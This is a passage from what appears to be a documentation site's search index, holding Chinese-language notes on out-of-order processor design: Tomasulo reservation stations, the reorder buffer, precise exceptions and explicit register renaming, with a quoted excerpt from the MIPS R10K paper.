<p>\u200b\u53ef\u4ee5\u200b\u601d\u8003\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u7684\u200b\u74f6\u9888\u200b\u5728\u200b\u4ec0\u4e48\u200b\u5730\u65b9\u200b\u3002\u200b\u9996\u5148\u200b\uff0c\u200b\u6bcf\u6761\u200b\u6307\u4ee4\u200b\u90fd\u200b\u653e\u5728\u200b\u4e00\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\uff0c\u200b\u5f53\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u6ee1\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u53d1\u5c04\u200b\u65b0\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002\u200b\u5176\u6b21\u200b\uff0c\u200b\u5982\u679c\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u7684\u200b\u541e\u5410\u200b\u8ddf\u4e0d\u4e0a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b\u586b\u5145\u200b\u901f\u5ea6\u200b\uff0c\u200b\u4e5f\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u963b\u585e\u200b\u3002</p> <p>\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u9ebb\u70e6\u200b\u7684\u200b\u70b9\u200b\u5728\u4e8e\u200b\u96be\u4ee5\u5b9e\u73b0\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u3002\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u7684\u200b\u5173\u952e\u5728\u4e8e\u200b\uff0c\u200b\u5f02\u5e38\u200b\u4e4b\u524d\u200b\u7684\u200b\u6307\u4ee4\u200b\u90fd\u200b\u751f\u6548\u200b\uff0c\u200b\u5f02\u5e38\u200b\u548c\u200b\u5f02\u5e38\u200b\u4e4b\u540e\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e0d\u200b\u751f\u6548\u200b\uff0c\u200b\u4f46\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u65e0\u6cd5\u200b\u8fdb\u884c\u200b\u533a\u5206\u200b\u3002</p> <p>\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u91cd\u547d\u540d\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u770b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u5c5e\u4e8e\u200b Implicit Register Renaming\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u628a\u200b Register \u200b\u91cd\u547d\u540d\u200b\u4e3a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b ID\u3002</p> <p>\u200b\u518d\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u9700\u8981\u200b\u54ea\u4e9b\u200b\u8bfb\u5199\u200b\u53e3\u200b\u3002\u200b\u6709\u200b\u4e00\u6761\u200b\u89c4\u5f8b\u200b\u662f\u200b\uff0c\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u9762\u79ef\u200b\u4e0e\u200b\u8bfb\u5199\u200b\u53e3\u200b\u4e2a\u6570\u200b\u7684\u200b\u5e73\u65b9\u200b\u6210\u6b63\u6bd4\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u6bcf\u6761\u200b\u53d1\u5c04\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5806\u8bfb\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8bfb\u53e3\u200b\u662f\u200b\u64cd\u4f5c\u6570\u200b x \u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\u6570\u200b\u3002\u200b\u5f53\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u5b8c\u6210\u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6bcf\u4e2a\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u90fd\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u5199\u53e3\u200b\u3002</p> <p>\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6027\u80fd\u200b\uff0c\u200b\u5e0c\u671b\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u53ef\u4ee5\u200b\u505a\u200b\u7684\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u5bb9\u7eb3\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u91cc\u9762\u200b\u81f3\u5c11\u200b\u8981\u200b\u4fdd\u5b58\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u5360\u7528\u200b\u9762\u79ef\u200b\uff0c\u200b\u5e76\u4e14\u200b\u65f6\u5ef6\u200b\u4e5f\u200b\u6bd4\u8f83\u200b\u5927\u200b\u3002</p>"},{"location":"hardware/ooo_cpu.html#rob-reorder-buffer","title":"ROB (ReOrder Buffer)","text":"<p>\u200b\u53c2\u8003\u200b\u6559\u6750\u200b\uff1aStanford CS349G</p> <p>\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5f15\u5165\u200b ROB\u3002\u200b\u5728\u200b\u4e0a\u9762\u200b\u7684\u200b Tomasulo \u200b\u7b97\u6cd5\u200b\u4e2d\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u8ba1\u7b97\u200b\u5b8c\u6210\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b\u5806\u4e2d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u65f6\u200b\u96be\u4ee5\u200b\u5f97\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u53d6\u503c\u200b\u3002\u200b\u65e2\u7136\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0e\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\u7684\u200b\u7ed3\u679c\u200b\u4e00\u81f4\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5f15\u5165\u200b ROB\u3002</p> <p>ROB \u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5faa\u73af\u200b\u961f\u5217\u200b\uff0c\u200b\u961f\u5217\u200b\u5934\u5c3e\u200b\u6307\u9488\u200b\u4e4b\u95f4\u200b\u5c31\u662f\u200b\u6b63\u5728\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b ROB \u200b\u8868\u9879\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u6307\u4ee4\u200b\u7684\u200b\u72b6\u6001\u200b\u3001\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u548c\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5c06\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u503c\u200b\u3002ROB \u200b\u4f1a\u200b\u68c0\u67e5\u200b\u961f\u5217\u200b\u5934\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u5df2\u7ecf\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u5f02\u5e38\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u751f\u6548\u200b\uff0c\u200b\u5e76\u200b\u628a\u200b\u6307\u4ee4\u200b\u4ece\u200b\u961f\u5217\u200b\u5934\u200b\u4e2d\u200b\u5220\u53bb\u200b\uff0c\u200b\u7ee7\u7eed\u200b\u68c0\u67e5\u200b\u540e\u9762\u200b\u7684\u200b\u3002Decode \u200b\u51fa\u6765\u200b\u7684\u200b\u6307\u4ee4\u200b\u5219\u200b\u4f1a\u200b\u63d2\u5165\u200b\u5230\u200b ROB \u200b\u7684\u200b\u5c3e\u90e8\u200b\uff0c\u200b\u5e76\u4e14\u200b\u968f\u7740\u200b\u6307\u4ee4\u200b\u7684\u200b\u6267\u884c\u200b\u8fc7\u7a0b\u200b\u66f4\u65b0\u200b\u72b6\u6001\u200b\u3002\u200b\u9047\u5230\u200b\u5f02\u5e38\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5c31\u200b\u628a\u200b\u961f\u5217\u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u3001\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u548c\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u6e05\u7a7a\u200b\uff0c\u200b\u4ece\u200b\u5f02\u5e38\u200b\u5904\u7406\u200b\u5730\u5740\u200b\u5f00\u59cb\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u6b63\u786e\u6027\u200b\uff0c\u200b\u8fd0\u7b97\u200b\u5355\u5143\u200b\u7684\u200b\u8fd0\u7b97\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u5199\u5165\u200b ROB \u200b\u9879\u4e2d\u200b\uff0c\u200b\u5f53\u200b\u8fd9\u200b\u4e00\u9879\u200b\u5728\u200b ROB \u200b\u961f\u5217\u200b\u5934\u90e8\u200b\u88ab\u200b\u5220\u53bb\u200b\u65f6\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u3002\u200b\u5728\u200b\u7ecf\u5178\u200b Tomasulo \u200b\u4e2d\u200b\uff0c\u200b\u5bc4\u5b58\u5668\u200b\u91cd\u547d\u540d\u200b\u4e3a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b ID\uff0c\u200b\u4f46\u200b\u5728\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u5e94\u8be5\u200b\u91cd\u547d\u540d\u200b\u4e3a\u200b ROB \u200b\u7684\u200b ID\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u9700\u8981\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b ROB ID \u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u5f53\u200b\u6307\u4ee4\u200b\u8fdb\u5165\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u6216\u8005\u200b ROB \u200b\u4e2d\u200b\u53bb\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u5728\u200b CDB \u200b\u4e0a\u200b\u5e7f\u64ad\u200b\u7684\u200b\u4e5f\u200b\u662f\u200b ROB \u200b\u7684\u200b ID\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b ID\u3002</p> <p>\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\uff0cROB \u200b\u7684\u200b\u5927\u5c0f\u200b\u6210\u4e3a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u74f6\u9888\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6bcf\u6761\u200b\u5728\u200b\u6b63\u5728\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\u90fd\u200b\u9700\u8981\u200b\u5728\u200b ROB \u200b\u4e2d\u200b\u8bb0\u5f55\u200b\u4e00\u4efd\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u597d\u5904\u200b\u662f\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u3002</p>"},{"location":"hardware/ooo_cpu.html#explicit-register-renaming","title":"Explicit Register Renaming","text":"<p>\u200b\u4e0a\u9762\u200b\u4e24\u79cd\u200b\u8bbe\u8ba1\u200b\u90fd\u200b\u662f\u200b\u91c7\u7528\u200b\u7684\u200b Implicit Register Renaming \u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u7b2c\u4e00\u79cd\u200b\u65b9\u6cd5\u200b\u91cd\u547d\u540d\u200b\u5230\u200b\u4e86\u200b\u4fdd\u7559\u200b\u7ad9\u200b\uff0c\u200b\u7b2c\u4e8c\u79cd\u200b\u65b9\u6cd5\u200b\u91cd\u547d\u540d\u200b\u5230\u200b\u4e86\u200b ROB\u3002\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u628a\u200b\u5bc4\u5b58\u5668\u200b\u7f16\u53f7\u200b\u6620\u5c04\u200b\u5230\u200b\u7269\u7406\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u3002\u200b\u628a\u200b ISA \u200b\u4e2d\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u79f0\u4e3a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\uff08\u200b\u6bd4\u5982\u200b 32 \u200b\u4e2a\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff09\uff0cCPU \u200b\u4e2d\u200b\u5b9e\u9645\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u79f0\u4e3a\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e00\u822c\u200b\u4f1a\u200b\u6bd4\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u591a\u200b\u5f88\u591a\u200b\uff08\u200b\u4e00\u4e24\u767e\u4e2a\u200b\u751a\u81f3\u200b\u66f4\u200b\u591a\u200b\uff09\u3002</p> <p>Explicit Register Renaming \u200b\u548c\u200b ReOrder Buffer \u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u8bbe\u8ba1\u200b\u65b9\u5411\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5355\u72ec\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u6620\u5c04\u200b\u7684\u200b\u65b9\u6cd5\u200b\u548c\u200b\u524d\u9762\u200b\u7684\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b mapping\uff0c\u200b\u4ece\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u3002\u200b\u5f53\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b Dispatch \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u64cd\u4f5c\u6570\u200b\u5728\u200b mapping \u200b\u4e2d\u200b\u627e\u5230\u200b\u5b9e\u9645\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7f16\u53f7\u200b\u3002\u200b\u5982\u679c\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u8981\u200b\u5199\u5165\u200b\u65b0\u200b\u7684\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5219\u200b\u4ece\u672a\u200b\u5206\u914d\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b mapping\uff0c\u200b\u5373\u200b\u628a\u200b\u5199\u5165\u200b\u7684\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u6620\u5c04\u200b\u5230\u200b\u65b0\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e0a\u200b\u3002\u200b\u7136\u540e\u200b\uff0c\u200b\u653e\u5230\u200b Issue Queue \u200b\u4e2d\u200b\u3002</p> <p>Issue Queue \u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b\u7b80\u5316\u7248\u200b\uff0c\u200b\u5b83\u200b\u4e0d\u518d\u200b\u4fdd\u5b58\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u53d6\u503c\u200b\uff0c\u200b\u800c\u200b\u4ec5\u4ec5\u200b\u7ef4\u62a4\u200b\u64cd\u4f5c\u6570\u200b\u662f\u5426\u200b ready\u3002\u200b\u540e\u9762\u200b\u89e3\u91ca\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u53d6\u503c\u200b\u3002\u200b\u5728\u200b Issue Queue \u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u5728\u200b\u6240\u6709\u200b\u64cd\u4f5c\u6570\u200b\u90fd\u200b ready \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5219\u200b\u4f1a\u200b Issue \u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u7aef\u53e3\u200b\u4e2d\u200b\u3002\u200b\u6bcf\u4e2a\u200b\u7aef\u53e3\u200b\u5bf9\u5e94\u200b\u7740\u200b\u4e00\u4e2a\u200b\u6267\u884c\u200b\u5355\u5143\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4e24\u4e2a\u200b ALU \u200b\u7aef\u53e3\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u4e24\u4e2a\u200b ALU \u200b\u6267\u884c\u200b\u5355\u5143\u200b\u3002\u200b\u6307\u4ee4\u200b\u9996\u5148\u200b\u901a\u8fc7\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c\u200b\u4ee5\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e3a\u200b\u7f16\u53f7\u200b\u53bb\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u76f4\u63a5\u200b\u4f20\u7ed9\u200b\u6267\u884c\u200b\u5355\u5143\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u5b58\u200b\u4e0b\u6765\u200b\u3002\u200b\u5f53\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u6267\u884c\u200b\u5b8c\u6bd5\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7ed3\u679c\u200b\u4e5f\u200b\u662f\u200b\u5199\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u5806\u4e2d\u200b\uff0cROB \u200b\u4e0d\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u503c\u4ec5\u200b\u4fdd\u5b58\u200b\u5728\u200b\u5bc4\u5b58\u5668\u200b\u5806\u4e2d\u200b\uff0cIssue Queue \u200b\u548c\u200b ROB \u200b\u90fd\u200b\u53ea\u200b\u4fdd\u5b58\u200b\u4e00\u4e9b\u200b\u72b6\u6001\u200b\u4f4d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b83\u4eec\u200b\u53ef\u4ee5\u200b\u505a\u200b\u7684\u200b\u5f88\u5927\u200b\uff0c\u200b\u5178\u578b\u200b\u7684\u200b Issue Queue \u200b\u6709\u200b\u51e0\u5341\u9879\u200b\uff0cROB \u200b\u5219\u200b\u6709\u200b\u51e0\u767e\u200b\u9879\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u8ba8\u8bba\u200b\u4e00\u4e9b\u200b\u7ec6\u8282\u200b\u3002\u200b\u9996\u5148\u200b\u662f\u200b\uff0c\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4f55\u65f6\u200b\u91ca\u653e\u200b\u3002\u200b\u5f53\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u4e0b\u200b\u4e00\u6b21\u200b\u8fd9\u4e2a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u88ab\u200b\u5199\u5165\u200b\u4e4b\u524d\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b\u90fd\u200b\u6709\u200b\u53ef\u80fd\u200b\u88ab\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u4e2a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6620\u5c04\u200b\u8981\u200b\u4fdd\u7559\u200b\u3002\u200b\u5982\u679c\u200b\u6211\u4eec\u200b\u80fd\u200b\u4fdd\u8bc1\u200b\u8bfb\u53d6\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u7684\u200b\u6307\u4ee4\u200b\u90fd\u200b\u5df2\u7ecf\u200b\u5b8c\u6210\u200b\uff0c\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u91ca\u653e\u200b\u8fd9\u4e2a\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e86\u200b\u3002\u200b\u4e00\u4e2a\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u6211\u200b\u5728\u200b\u8986\u76d6\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6620\u5c04\u200b\u65f6\u200b\uff0c\u200b\u6211\u200b\u8fd8\u8981\u200b\u8bb0\u5f55\u200b\u539f\u6765\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5f53\u8be5\u200b\u6307\u4ee4\u200b\u5728\u200b ROB \u200b\u4e2d\u200b\u63d0\u4ea4\u200b\u4e86\u200b\uff08\u200b\u4ece\u961f\u200b\u5934\u200b\u51fa\u53bb\u200b\u4e86\u200b\uff09\uff0c\u200b\u8bf4\u660e\u200b\u4e4b\u524d\u200b\u53ef\u80fd\u200b\u4f9d\u8d56\u200b\u8fd9\u4e2a\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6240\u6709\u200b\u6307\u4ee4\u200b\u90fd\u200b\u5b8c\u6210\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b\u539f\u6765\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u653e\u5230\u200b\u672a\u200b\u6620\u5c04\u200b\u7684\u200b\u5217\u8868\u200b\u4e2d\u200b\u3002</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b\u9047\u5230\u200b\u5f02\u5e38\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u4f55\u200b\u6062\u590d\u200b\u5728\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b\u5904\u200b\u7684\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6620\u5c04\u200b\u5462\u200b\uff1f\u200b\u4e00\u4e2a\u200b\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u5229\u7528\u200b\u6211\u200b\u5728\u200b ROB \u200b\u4e2d\u200b\u8bb0\u5f55\u200b\u7684\u200b\u88ab\u200b\u8986\u76d6\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7f16\u53f7\u200b\uff0c\u200b\u4ece\u200b ROB \u200b\u961f\u5c3e\u200b\u5f80\u524d\u200b\u56de\u6eda\u200b\uff0c\u200b\u5f53\u200b\u53d1\u73b0\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u8986\u76d6\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u6620\u5c04\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u6062\u590d\u200b\u4e3a\u200b\u8986\u76d6\u200b\u4e4b\u524d\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u8fd9\u6837\u200b\uff0c\u200b\u5f53\u56de\u200b\u6eda\u200b\u5230\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5f97\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u6620\u5c04\u200b\u3002MIPS R10K \u200b\u7684\u200b\u8bba\u6587\u200b\u4e2d\u662f\u200b\u8fd9\u4e48\u200b\u63cf\u8ff0\u200b\u7684\u200b\uff1a</p> <pre><code>The active list contains the logical-destination register number and its\nold physical-register number for each instruction. An instruction's\ngraduation commits its new mapping, so the old physical register can\nreturn to the free list for reuse. When an exception occurs, however,\nsubsequent instructions never graduate. Instead, the processor restores\nold mappings from the active list. The R1OOOO unmaps four instructions\nper cycle--in reverse order, in case it renamed the same logical\nregister twice. Although this is slower than restoring a branch,\nexceptions are much rarer than mispredicted branches. The processor\nreturns new physical registers to the free lists by restoring their read\npointers.\n</code></pre> <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u529e\u6cd5\u200b\u662f\u200b\u8bb0\u5f55\u200b\u4e00\u4e2a\u200b Committed Map Table\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b ROB Head \u200b\u7684\u200b\u6307\u4ee4\u200b\u88ab\u200b Commit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u624d\u200b\u66f4\u65b0\u200b Committed Map Table\uff0c\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u6620\u5c04\u200b\u8868\u200b\u3002\u200b\u5f53\u200b\u53d1\u751f\u200b\u5f02\u5e38\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b Committed Map Table \u200b\u8986\u76d6\u200b\u5230\u200b Register Map Table \u200b\u4e0a\u200b\u3002\u200b\u8fd9\u6837\u200b\u9700\u8981\u200b\u7684\u200b\u5468\u671f\u200b\u6bd4\u8f83\u200b\u5c11\u200b\uff0c\u200b\u4f46\u662f\u200b\u65f6\u5e8f\u200b\u53ef\u80fd\u200b\u6bd4\u8f83\u200b\u5dee\u200b\u3002\u200b\u53c2\u8003\u200b BOOM \u200b\u6587\u6863\u200b\u3002</p>"},{"location":"hardware/ooo_cpu.html#implicit-renamingrob-explicit-renaming","title":"Implicit Renaming(ROB) \u200b\u548c\u200b Explicit Renaming \u200b\u7684\u200b\u6bd4\u8f83","text":"<p>\u200b\u8fd9\u200b\u4e24\u79cd\u200b\u65b9\u6cd5\u200b\u4e3b\u8981\u200b\u533a\u522b\u200b\uff1a</p> <ol> <li>Implicit Renaming 